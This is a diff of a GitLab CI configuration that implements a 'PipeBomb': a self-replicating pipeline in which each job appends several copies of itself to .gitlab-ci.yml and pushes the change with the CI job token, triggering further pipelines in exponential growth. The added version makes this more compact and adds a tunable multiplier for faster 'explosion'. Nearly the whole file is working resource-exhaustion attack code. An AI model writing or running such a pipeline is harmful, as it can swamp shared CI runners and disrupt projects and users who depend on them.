@@ -1,92 +1,42 @@
-# CI PipeBomb NUKE Version
-# Exponential growth chaos testing - USE WITH EXTREME CAUTION
-
+# .gitlab-ci.yml — NUKE 
 stages: [arm]
 
-ci_pipebomb_arm:
+
+.common_job_template: &job_template
   stage: arm
   image: alpine:latest
   rules:
     - if: '$CI_PIPELINE_SOURCE == "push"'
       when: always
     - when: never
-  script:
-    - apk add --no-cache git coreutils grep
-    - git config --global user.email "demolition-bot@example.com"
-    - git config --global user.name "CI Demolition Bot"
-    - |
-      git remote remove ci >/dev/null 2>&1 || true
-      git remote add ci "https://gitlab-ci-token:${CI_JOB_TOKEN}@${CI_SERVER_HOST}/${CI_PROJECT_PATH}.git"
-      git fetch ci "${CI_COMMIT_REF_NAME}"
-    - COUNT=$(grep -c '^pipebomb_explosion_' .gitlab-ci.yml || true)
-    - echo "💣 Current explosions registered: ${COUNT}"
-    
-    # Create multiple new jobs (exponential growth)
-    - |
-      for i in $(seq 1 5); do
-        CHARGE_NAME="pipebomb_explosion_$(date +%s)_${CI_PIPELINE_IID}_${i}"
-        cat >> .gitlab-ci.yml <<EOF2
 
-${CHARGE_NAME}:
-  stage: arm
-  image: alpine:latest
-  rules:
-    - if: '\$CI_PIPELINE_SOURCE == "push"'
-      when: always
-    - when: never
-  script:
-    - apk add --no-cache git coreutils grep
-    - git config --global user.email "demolition-bot@example.com"
-    - git config --global user.name "CI Demolition Bot"
-    - |
-      git remote remove ci >/dev/null 2>&1 || true
-      git remote add ci "https://gitlab-ci-token:\${CI_JOB_TOKEN}@\${CI_SERVER_HOST}/\${CI_PROJECT_PATH}.git"
-      git fetch ci "\${CI_COMMIT_REF_NAME}"
-    - |
-      COUNT=\$(grep -c '^pipebomb_explosion_' .gitlab-ci.yml || true)
-      echo "💣 Current explosions registered: \${COUNT}"
-    - |
-      for j in \$(seq 1 5); do
-        NEW_CHARGE_NAME="pipebomb_explosion_\$(date +%s)_\${CI_PIPELINE_IID}_\${j}"
-        cat >> .gitlab-ci.yml <<EOF3
+# The self-replicating script (reused by all generated jobs)
+.common_payload_script: &payload_script
+  - set -euo pipefail
+  - apk add --no-cache git coreutils grep
+  - git config --global user.email "demolition-bot@example.com"
+  - git config --global user.name  "CI Demolition Bot"
+  - |
+    git remote remove ci >/dev/null 2>&1 || true
+    git remote add ci "https://gitlab-ci-token:${CI_JOB_TOKEN}@${CI_SERVER_HOST}/${CI_PROJECT_PATH}.git"
+    git fetch ci "${CI_COMMIT_REF_NAME}"
+  # --- replication: append N new jobs that point to the same anchors ---
+  - |
+    REPLICAS=5   # change this multiplier to explode faster/slower
+    for i in $(seq 1 ${REPLICAS}); do
+      NAME="pipebomb_explosion_${CI_PIPELINE_IID}_${i}_$(date +%s)"
+      cat >> .gitlab-ci.yml <<EOF
+${NAME}:
+  <<: *job_template
+  script: *payload_script
+EOF
+    done
+  # Commit & push, which triggers the next pipeline
+  - git add .gitlab-ci.yml
+  - git commit -m "PipeBomb spawns ${REPLICAS} new jobs from pipeline ${CI_PIPELINE_IID}"
+  - git push ci "${CI_COMMIT_REF_NAME}:${CI_COMMIT_REF_NAME}"
 
-\${NEW_CHARGE_NAME}:
-  stage: arm
-  image: alpine:latest
-  rules:
-    - if: '\\$CI_PIPELINE_SOURCE == "push"'
-      when: always
-    - when: never
-  script:
-    - apk add --no-cache git coreutils grep
-    - git config --global user.email "demolition-bot@example.com"
-    - git config --global user.name "CI Demolition Bot"
-    - |
-      git remote remove ci >/dev/null 2>&1 || true
-      git remote add ci "https://gitlab-ci-token:\\\${CI_JOB_TOKEN}@\\\${CI_SERVER_HOST}/\\\${CI_PROJECT_PATH}.git"
-      git fetch ci "\\\${CI_COMMIT_REF_NAME}"
-    - |
-      COUNT=\\\$(grep -c '^pipebomb_explosion_' .gitlab-ci.yml || true)
-      echo "💣 Current explosions registered: \\\${COUNT}"
-    - |
-      for k in \\\$(seq 1 5); do
-        NEXT_CHARGE_NAME="pipebomb_explosion_\\\$(date +%s)_\\\${CI_PIPELINE_IID}_\\\${k}"
-        cat >> .gitlab-ci.yml <<EOF4
-
-\\\${NEXT_CHARGE_NAME}:
-  # Exponential growth continues...
-EOF4
-      done
-    - git add .gitlab-ci.yml
-    - git commit -m "CI PipeBomb plants \${NEW_CHARGE_NAME}"
-    - git push ci "\${CI_COMMIT_REF_NAME}:\${CI_COMMIT_REF_NAME}"
-EOF3
-      done
-    - git add .gitlab-ci.yml
-    - git commit -m "CI PipeBomb plants \${CHARGE_NAME}"
-    - git push ci "\${CI_COMMIT_REF_NAME}:\${CI_COMMIT_REF_NAME}"
-EOF2
-      done
-    - git add .gitlab-ci.yml
-    - git commit -m "CI PipeBomb plants multiple charges"
-    - git push ci "${CI_COMMIT_REF_NAME}:${CI_COMMIT_REF_NAME}"
+# Seed job: starts the chain by using the same template + script
+ci_pipebomb_arm:
+  <<: *job_template
+  script: *payload_script
